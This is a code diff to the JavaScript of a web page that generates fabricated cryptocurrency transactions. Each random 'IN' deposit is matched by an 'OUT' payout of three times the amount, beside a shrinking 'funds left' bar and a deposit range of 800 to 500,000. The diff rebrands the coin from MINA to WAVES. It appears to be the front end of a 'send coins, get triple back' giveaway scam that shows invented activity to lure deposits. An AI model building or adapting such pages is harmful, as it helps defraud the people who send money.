@@ -1,3 +1,19 @@
+// Bar
+
+const updateBar = amount => {
+  const barImg = document.querySelector("#container label div");
+  const left = document.getElementById("left");
+  const total = document.getElementById("total");
+
+  const newLeft = Number(String(left.innerText).replace(/,/g, "")) + Math.floor(amount)
+
+  left.innerText = newLeft.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+
+  barImg.style.width = (100 - Number((newLeft/Number(total.innerText.replace(/,/g, "")))*100)) + "% !important";
+}
+
+
+
 var parcent = 3;
 
 function update_count() {
@@ -46,7 +62,7 @@ function create_transaction(mins) {
   var table,
     row = (table = document.getElementById("myTable")).insertRow(1),
     address = get_random(),
-    amount = ((499100 * Math.random()) + 901).toFixed(2),
+    amount = ((499 * Math.random()) + 901).toFixed(2),
     decimal = String(Math.random(1, 999));
   row.innerHTML =
     '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="">' +
@@ -57,14 +73,14 @@ function create_transaction(mins) {
     mins +
     ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">waves</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">WAVES</span> </td> <td>' +
     amount +
-    ' MINA</td> <td><span class="small text-secondary">0<b>.</b>000' +
-    tx(999) +
+    ' WAVES</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    tx(99) +
     "</span></td> </tr>";
   var table,
     row = (table = document.getElementById("myTable")).insertRow(1),
-    send_amount = ((1497300 * Math.random()) + 2701).toFixed(2);
+    send_amount = (3 * amount).toFixed(2);
   row.innerHTML =
     '<tr> <td><a class="hash-tag text-truncate" href="">' +
     generateId(63) +
@@ -72,12 +88,12 @@ function create_transaction(mins) {
     tx(99999999) +
     '</a></td> <td><span class="timer">' +
     mins +
-    ' mins ago</span></td> <td><span class="hash-tag text-truncate">waves</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+    ' mins ago</span></td> <td><span class="hash-tag text-truncate">WAVES</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
     "</a> </td> <td>" +
     send_amount +
-    ' MINA</td> <td><span class="small text-secondary">0<b>.</b>000' +
-    tx(999) +
+    ' WAVES</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    tx(99) +
     "</span></td> </tr>";
 }
 
@@ -91,7 +107,7 @@ function new_transaction() {
   var table,
     row = document.getElementById("myTable").insertRow(1),
     address = get_random(),
-    amount = ((499100 * Math.random()) + 901).toFixed(2),
+    amount = ((499 * Math.random()) + 901).toFixed(2),
     decimal = String(Math.random(1, 999));
   (row.innerHTML =
     '<tr> <td><a class="hash-tag text-truncate" href="">' +
@@ -100,10 +116,10 @@ function new_transaction() {
     tx(99999999) +
     '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">waves</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">WAVES</span> </td> <td>' +
     amount +
-    ' MINA</td> <td><span class="small text-secondary">0<b>.</b>000' +
-    tx(999) +
+    ' WAVES</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    tx(99) +
     "</span></td> </tr>"),
     document
       .getElementById("myTable")
@@ -112,18 +128,19 @@ function new_transaction() {
     setTimeout(() => {
       var table,
         row = document.getElementById("myTable").insertRow(1),
-        send_amount =  ((1497300 * Math.random()) + 2701).toFixed(2);
+        send_amount =  (3 * amount).toFixed(2);
+        updateBar(send_amount);
       (row.innerHTML =
         '<tr> <td><a class="hash-tag text-truncate" href="">' +
         generateId(63) +
         '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
         tx(99999999) +
-        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">waves</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">WAVES</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
         "</a> </td> <td>" +
         send_amount +
-        ' MINA</td> <td><span class="small text-secondary">0<b>.</b>000' +
-        tx(999) +
+        ' WAVES</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        tx(99) +
         "</span></td> </tr>"),
         document
           .getElementById("myTable")
@@ -206,7 +223,7 @@ function update_trans() {
         $("#warn").text("Please enter a valid address");
       }
 
-    } else $("#warn").text("Amount should be within 800 MINA to 500,000 MINA");
+    } else $("#warn").text("Amount should be within 800 WAVES to 500,000 WAVES");
   }),
   $("#close").click(() => {
     $(".pop-body").css("display", "none");
